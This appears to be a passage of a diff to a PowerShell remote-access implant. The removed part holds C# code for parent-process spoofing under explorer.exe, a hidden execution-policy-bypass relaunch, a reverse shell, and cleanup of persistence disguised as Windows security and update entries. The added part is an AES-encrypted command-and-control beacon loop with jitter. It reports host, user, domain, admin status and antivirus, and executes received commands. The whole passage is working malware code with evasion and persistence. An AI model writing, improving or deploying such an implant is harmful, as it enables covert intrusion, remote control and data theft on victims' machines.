-    public static extern bool CreateProcess(
-        string lpApplicationName,
-        string lpCommandLine,
-        IntPtr lpProcessAttributes,
-        IntPtr lpThreadAttributes,
-        bool bInheritHandles,
-        uint dwCreationFlags,
-        IntPtr lpEnvironment,
-        string lpCurrentDirectory,
-        ref STARTUPINFOEX lpStartupInfo,
-        out PROCESS_INFORMATION lpProcessInformation);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool InitializeProcThreadAttributeList(
-        IntPtr lpAttributeList,
-        int dwAttributeCount,
-        int dwFlags,
-        ref IntPtr lpSize);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool UpdateProcThreadAttribute(
-        IntPtr lpAttributeList,
-        uint dwFlags,
-        IntPtr Attribute,
-        IntPtr lpValue,
-        IntPtr cbSize,
-        IntPtr lpPreviousValue,
-        IntPtr lpReturnSize);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr hObject);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(
-        uint dwDesiredAccess,
-        bool bInheritHandle,
-        int dwProcessId);
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO {
-        public int cb;
-        public string lpReserved;
-        public string lpDesktop;
-        public string lpTitle;
-        public int dwX;
-        public int dwY;
-        public int dwXSize;
-        public int dwYSize;
-        public int dwXCountChars;
-        public int dwYCountChars;
-        public int dwFillAttribute;
-        public int dwFlags;
-        public short wShowWindow;
-        public short cbReserved2;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdError;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFOEX {
-        public STARTUPINFO StartupInfo;
-        public IntPtr lpAttributeList;
-    }
-
-    public static bool CreateProcessWithParent(int parentPID, string commandLine) {
-        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
-        const uint CREATE_NO_WINDOW = 0x08000000;
-        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
-
-        STARTUPINFOEX siex = new STARTUPINFOEX();
-        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-        
-        IntPtr lpSize = IntPtr.Zero;
-        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
-        siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-        InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, ref lpSize);
-
-        IntPtr hParent = OpenProcess(0x001F0FFF, false, parentPID);
-        if (hParent == IntPtr.Zero) return false;
-
-        IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
-        Marshal.WriteIntPtr(lpValueProc, hParent);
-
-        UpdateProcThreadAttribute(
-            siex.lpAttributeList,
-            0,
-            (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-            lpValueProc,
-            (IntPtr)IntPtr.Size,
-            IntPtr.Zero,
-            IntPtr.Zero);
-
-        siex.StartupInfo.cb = Marshal.SizeOf(siex);
-        
-        bool result = CreateProcess(
-            null,
-            commandLine,
-            IntPtr.Zero,
-            IntPtr.Zero,
-            false,
-            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
-            IntPtr.Zero,
-            null,
-            ref siex,
-            out pi);
-
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        CloseHandle(hParent);
-        Marshal.FreeHGlobal(lpValueProc);
-        Marshal.FreeHGlobal(siex.lpAttributeList);
-
-        return result;
-    }
-}
-"@
-
-        # Add the type
-        Add-Type -TypeDefinition $code -Language CSharp -ErrorAction Stop
-        
-        # Prepare command to re-execute this script under explorer.exe
-        $currentScript = $ScriptPath
-        $cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"Get-Content '$currentScript' -Raw | iex`""
-        
-        # Create process with spoofed parent
-        $success = [PPIDSpoof]::CreateProcessWithParent($explorerPID, $cmd)
-        
-        if ($success) {
-            # Exit current process since we've spawned the spoofed one
-            exit
-        }
-        
-    } catch {
-        # If PPID spoofing fails, continue with current process
-    }
-}
-
-# Check if we're already running under explorer.exe
-$currentProcess = Get-WmiObject Win32_Process -Filter "ProcessId = $PID"
-$parentPID = $currentProcess.ParentProcessId
-$parentProcess = Get-Process -Id $parentPID -ErrorAction SilentlyContinue
-
-# If parent is not explorer.exe, attempt PPID spoofing
-if ($parentProcess -and $parentProcess.Name -ne "explorer") {
-    Start-PPIDSpoofing
-}
-
-# ---------------------
-# 6. THE PAYLOAD (Reverse Shell)
-# ---------------------
-
-$reconnectAttempts = 0
-$maxReconnectDelay = 300  # Max 5 minutes between attempts
+# Main C2 loop with encryption
+$failedAttempts = 0
 
 while ($true) {
     $client = $null
@@ -549,7 +625,9 @@ while ($true) {
     $writer = $null
     
     try {
-        $reconnectAttempts++
+        # Apply jitter to beacon interval
+        $sleepTime = $BeaconInterval * (1 + ((Get-Random -Minimum 0 -Maximum 100) / 100 * $Jitter))
+        Start-Sleep -Seconds $sleepTime
         
         # Connect to C2
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
@@ -558,114 +636,63 @@ while ($true) {
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
         
-        # Send connection info
-        $writer.WriteLine("=== Session Established ===")
-        $writer.WriteLine("Host: $(hostname)")
-        $writer.WriteLine("User: $(whoami)")
-        $writer.WriteLine("OS: $([System.Environment]::OSVersion.VersionString)")
-        $writer.WriteLine("Install: $ScriptPath")
-        $writer.WriteLine("Persist: $TaskName")
-        $writer.WriteLine("===========================")
+        # Send encrypted banner
+        $banner = @"
+=== Session Established ===
+Host: $(hostname)
+User: $(whoami)
+OS: $([System.Environment]::OSVersion.VersionString)
+Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)
+Admin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+AV: $(Get-InstalledAV)
+Install: $ScriptPath
+===========================
+"@
         
-        $reconnectAttempts = 0  # Reset on successful connection
+        $encryptedBanner = Encrypt-String -PlainText $banner -Key $AESKey
+        $writer.WriteLine($encryptedBanner)
+        
+        $failedAttempts = 0  # Reset on successful connection
         
         # Command loop
         while ($client.Connected) {
-            $writer.Write("PS $((Get-Location).Path)> ")
+            $writer.Write("READY")
             
-            $command = $reader.ReadLine()
+            $encryptedCommand = $reader.ReadLine()
+            if ($null -eq $encryptedCommand) { break }
             
-            if ($null -eq $command) { 
-                break 
-            }
+            $command = Decrypt-String -EncryptedText $encryptedCommand -Key $AESKey
+            if ($null -eq $command) { continue }
             
             $command = $command.Trim()
             
-            if ($command -eq "exit" -or $command -eq "quit") { 
-                break 
-            }
+            if ($command -eq "exit") { break }
+            if ($command -eq "") { continue }
             
-            if ($command -eq "") { 
-                continue 
-            }
-            
-            # Handle cd command
-            if ($command.ToLower().StartsWith("cd ")) {
-                $newPath = $command.Substring(3).Trim().Replace('"','').Replace("'","")
-                try {
-                    Set-Location $newPath
-                    $writer.WriteLine("")
-                } catch {
-                    $writer.WriteLine("Error: $($_.Exception.Message)")
-                }
-                continue
-            }
-            
-            # Special command: self-destruct
-            if ($command -eq "cleanup") {
-                $writer.WriteLine("Initiating full cleanup...")
-                
-                # Remove scheduled task
-                Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-                
-                # Remove ALL registry keys
-                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthSystray" -ErrorAction SilentlyContinue
-                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SecurityHealthCheck" -ErrorAction SilentlyContinue
-                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -ErrorAction SilentlyContinue
-                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "SystemCheck" -ErrorAction SilentlyContinue
-                Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthService" -ErrorAction SilentlyContinue
-                Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WindowsDefenderUpdate" -ErrorAction SilentlyContinue
-                
-                # Remove startup folder shortcut
-                Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealthSystray.lnk" -Force -ErrorAction SilentlyContinue
-                
-                # Remove WMI subscription
-                Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-                Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-                Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%WindowsUpdateCheck%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-                
-                # Remove service
-                $ServiceName = "WindowsUpdateTaskManager"
-                Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
-                sc.exe delete $ServiceName 2>$null | Out-Null
-                
-                # Remove all installed files
-                foreach ($loc in $Locations) {
-                    Remove-Item -Path $loc -Force -ErrorAction SilentlyContinue
-                }
-                
-                $writer.WriteLine("Cleanup complete. Terminating...")
-                break
-            }
-            
-            # Execute command
+            # Execute and encrypt response
             $output = try {
                 Invoke-Expression $command 2>&1 | Out-String
             } catch {
                 "Error: $($_.Exception.Message)"
             }
             
-            if ([string]::IsNullOrWhiteSpace($output)) { 
-                $output = "`n" 
-            }
+            if ([string]::IsNullOrWhiteSpace($output)) { $output = "Command executed (no output)" }
             
-            $writer.Write($output)
+            $encryptedOutput = Encrypt-String -PlainText $output -Key $AESKey
+            $writer.WriteLine($encryptedOutput)
         }
         
     } catch {
-        # Exponential backoff with jitter
-        $baseDelay = [Math]::Min(30 * [Math]::Pow(1.5, [Math]::Min($reconnectAttempts, 6)), $maxReconnectDelay)
-        $jitter = Get-Random -Minimum 0 -Maximum 30
-        $sleepTime = $baseDelay + $jitter
+        $failedAttempts++
         
-        Start-Sleep -Seconds $sleepTime
+        # Exponential backoff (no server cycling since we only have one)
+        $backoff = [Math]::Min(30 * [Math]::Pow(2, [Math]::Min($failedAttempts, 5)), 300)
+        Start-Sleep -Seconds $backoff
         
     } finally {
-        # Cleanup
         if ($null -ne $writer) { try { $writer.Close() } catch {} }
         if ($null -ne $reader) { try { $reader.Close() } catch {} }
         if ($null -ne $stream) { try { $stream.Close() } catch {} }
         if ($null -ne $client) { try { $client.Close() } catch {} }
     }
 }
-
